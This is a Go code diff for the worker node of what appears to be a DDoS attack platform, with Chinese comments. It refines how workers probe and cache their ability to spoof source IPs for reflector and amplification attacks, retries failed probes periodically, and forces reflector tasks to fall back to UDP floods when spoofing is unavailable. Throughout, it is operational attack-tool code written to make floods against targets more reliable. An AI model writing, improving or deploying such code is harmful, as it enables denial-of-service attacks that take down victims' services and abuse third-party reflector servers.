@@ -52,7 +52,15 @@ type Worker struct {
 	activeTasks          map[string]*attack.AttackSession
 	activeComboTasks     map[string]*attack.ComboSession
 	isWindows            bool
-	canSpoofIP           bool
+	canSpoofIP           atomic.Bool
+	// spoofProbed 是否已获得可靠的伪造能力探测结果（含缓存命中）。
+	// 周期维护协程据此决定：未探测 → 重试探测；已探测 → 周期上报状态。
+	spoofProbed atomic.Int32
+	// spoofProbeRunning 防止探测维护协程重入（探测最长约 10s）
+	spoofProbeRunning atomic.Int32
+	// spoofResultCh 探测结果回传通道：探测协程只做网络 IO，
+	// 结果经通道在主循环应用（canSpoofIP/localPool 只能由主循环写，避免竞争）
+	spoofResultCh chan spoofProbeResult
 	proxySource          string
 	maxBWMbps            int
 	heartbeatFailStreak  int32
@@ -113,9 +121,9 @@ func New(id, controllerAddr, authToken, proxySource string, maxBWMbps int) *Work
 		activeTasks:       make(map[string]*attack.AttackSession),
 		activeComboTasks:  make(map[string]*attack.ComboSession),
 		isWindows:         runtime.GOOS == "windows",
-		canSpoofIP:        false,
 		statsIntervalMs:   500,
 		useLocalPool:      false,
+		spoofResultCh:     make(chan spoofProbeResult, 1),
 		autoTuneFactor:    1.0,
 		reflectorVersions: make(map[string]string),
 		selfVersion:       computeSelfVersion(),
@@ -423,13 +431,15 @@ func (w *Worker) Run(ctx context.Context) error {
 	// 顺序：Controller 缓存（按 IP 持久化，同 IP 重上线直接打标签）→
 	// 本地 SQLite 缓存 → 真实探测
 	if ctrlCached, found := w.queryControllerSpoofCache(); found {
-		w.canSpoofIP = ctrlCached
+		w.canSpoofIP.Store(ctrlCached)
+		w.spoofProbed.Store(1)
 		log.Printf("[spoof-probe] loaded controller cache: can_spoof=%v (IP-based, no probe needed)", ctrlCached)
 	} else if w.localPool != nil {
 		// 优先使用本地缓存（TTL: spoofCapabilityTTL）
 		cached, testedAt, err := w.loadSpoofCapability()
 		if err == nil && time.Since(testedAt) < spoofCapabilityTTL {
-			w.canSpoofIP = cached
+			w.canSpoofIP.Store(cached)
+			w.spoofProbed.Store(1)
 			log.Printf("[spoof-probe] loaded cached result: can_spoof=%v (tested %s ago)",
 				cached, time.Since(testedAt).Round(time.Minute))
 			// 缓存结果也上报（如 Controller 重启后节点状态被重置）
@@ -441,7 +451,8 @@ func (w *Worker) Run(ctx context.Context) error {
 
 			if reliable {
 				// 探测完整执行：结果可信，落盘缓存
-				w.canSpoofIP = result
+				w.canSpoofIP.Store(result)
+				w.spoofProbed.Store(1)
 				if err := w.saveSpoofCapability(result); err != nil {
 					log.Printf("[spoof-probe] failed to save result: %v", err)
 				}
@@ -449,26 +460,37 @@ func (w *Worker) Run(ctx context.Context) error {
 			} else if err == nil {
 				// 探测不可靠（网络抖动/Controller 不可达）但存在过期缓存：
 				// 保守沿用旧值，避免一次抖动永久误关 IP 伪造
-				w.canSpoofIP = cached
+				w.canSpoofIP.Store(cached)
+				w.spoofProbed.Store(1)
 				log.Printf("[spoof-probe] probe unreliable, keeping cached value: can_spoof=%v", cached)
 				w.reportSpoofStatus()
 			} else {
-				// 无任何历史数据，保守关闭
-				w.canSpoofIP = false
-				w.reportSpoofStatus()
+				// 无任何历史数据且探测不可靠：不急于上报 false（会把
+				// 可能支持伪造的节点误标为不支持），保持"待检测"，
+				// 由周期维护协程重试探测直到得到可靠结果。
+				log.Printf("[spoof-probe] no cache and probe unreliable, will retry periodically")
 			}
 		}
 	} else {
 		// 未启用本地池：仅做内存探测，不落盘
 		log.Printf("[spoof-probe] no local pool, probing in-memory...")
-		w.canSpoofIP, _ = w.probeIPSpoofing()
-		w.reportSpoofStatus()
+		result, reliable := w.probeIPSpoofing()
+		w.canSpoofIP.Store(result)
+		if reliable {
+			w.spoofProbed.Store(1)
+			w.reportSpoofStatus()
+		} else {
+			// 同上：探测不可靠保持"待检测"，由周期维护协程重试
+			log.Printf("[spoof-probe] probe unreliable, will retry periodically")
+		}
 	}
 
 	// 探测最终确认：即使平台支持（root+Linux），实际网络环境仍可能
 	// 禁止伪造（如 VPS/云主机）。此时反射器池依然毫无意义，停止本地池
 	// 并清除引用，避免后续拉取/重测反射器白白消耗带宽与 CPU。
-	if !w.canSpoofIP && w.localPool != nil {
+	// 仅在已有可靠结果时才停池：不可靠探测（w.spoofProbed=0）不停，
+	// 否则启动瞬间网络抖动会误杀本地池，且重试探测成功也无法恢复。
+	if w.spoofProbed.Load() == 1 && !w.canSpoofIP.Load() && w.localPool != nil {
 		log.Printf("[worker] IP spoofing confirmed unavailable — stopping local reflector pool")
 		w.localPool.Stop()
 		w.localPool = nil
@@ -506,6 +528,11 @@ func (w *Worker) Run(ctx context.Context) error {
 	defer recoveryTicker.Stop()
 	recoveryTicker.Stop()
 
+	// spoof 能力维护：每 60s 重试未完成的探测 / 周期上报状态。
+	// 在独立 goroutine 执行（探测最长 ~10s），不阻塞心跳主循环。
+	spoofTicker := time.NewTicker(60 * time.Second)
+	defer spoofTicker.Stop()
+
 	inRecovery := false
 	startupStabilized := false
 	startupTimer := time.NewTimer(30 * time.Second)
@@ -528,6 +555,12 @@ func (w *Worker) Run(ctx context.Context) error {
 			if autoTuneEnabled {
 				w.autoTuneThreads()
 			}
+		case <-spoofTicker.C:
+			go w.spoofProbeMaintenance()
+		case r := <-w.spoofResultCh:
+			// 探测结果在主循环应用：canSpoofIP/localPool 只由主循环写，
+			// 与任务派发路径（safeStartTask 读 canSpoofIP）无竞争
+			w.applySpoofProbeResult(r)
 		case <-ticker.C:
 			start := time.Now()
 			err := w.heartbeat()
@@ -969,7 +1002,7 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 	// 兜底 1（controller 默认已开）：即使任务未开启 fallback，
 	// 不支持伪造的 worker 执行反射器攻击也永远无法到达目标（响应打回自己），
 	// 强制降级为普通 UDP 并告警
-	if !w.canSpoofIP && isReflectorMethod(method) {
+	if !w.canSpoofIP.Load() && isReflectorMethod(method) {
 		if !task.FallbackToUdp {
 			log.Printf("[worker] task %s: reflector %s but spoof unavailable & fallback off — FORCED fallback to udp_stdhex", task.TaskId, method)
 		} else {
@@ -992,7 +1025,7 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 		RateLimitBPS: task.RateLimitBps,
 		BurstMode:    task.BurstMode,
 		JitterMs:     int(task.JitterMs),
-		CanSpoofIP:   w.canSpoofIP,
+		CanSpoofIP:   w.canSpoofIP.Load(),
 	}
 
 	log.Printf("[worker] starting task %s: %s targets=%d", task.TaskId, method, len(targets))
@@ -1470,7 +1503,7 @@ func (w *Worker) startComboTask(task *pb.AttackTask) {
 	for _, sub := range task.SubAttacks {
 		subMethod := sub.Method
 		// 与单任务一致：不支持伪造时强制降级，避免无效反射攻击
-		if !w.canSpoofIP && isReflectorMethod(subMethod) {
+		if !w.canSpoofIP.Load() && isReflectorMethod(subMethod) {
 			if !task.FallbackToUdp {
 				log.Printf("[worker] combo task %s: sub reflector %s but spoof unavailable & fallback off — FORCED fallback to udp_stdhex", task.TaskId, subMethod)
 			} else {
@@ -1487,7 +1520,7 @@ func (w *Worker) startComboTask(task *pb.AttackTask) {
 			Game:         sub.Game,
 			BurstMode:    sub.BurstMode,
 			JitterMs:     int(sub.JitterMs),
-			CanSpoofIP:   w.canSpoofIP,
+			CanSpoofIP:   w.canSpoofIP.Load(),
 		}
 		// 子攻击未单独限速时继承 combo 顶层限速，避免顶层配置被静默忽略
 		if subCfg.RateLimitPPS <= 0 && task.RateLimitPps > 0 {
